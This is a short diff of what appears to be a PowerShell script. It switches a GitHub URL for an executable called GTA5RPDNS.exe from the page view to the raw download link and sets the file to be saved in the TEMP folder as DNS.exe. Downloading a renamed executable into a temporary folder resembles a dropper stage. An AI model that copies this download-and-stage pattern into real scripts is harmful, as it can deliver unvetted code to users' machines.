@@ -1,5 +1,5 @@
 # Путь к файлу на удаленном сервере
-$url = "https://github.com/FREAKMANCHIK/WORK/blob/main/files/GTA5RPDNS.exe"
+$url = "https://github.com/FREAKMANCHIK/WORK/raw/main/files/GTA5RPDNS.exe"
 
 
 $outputPath = Join-Path -Path $env:TEMP -ChildPath "DNS.exe"
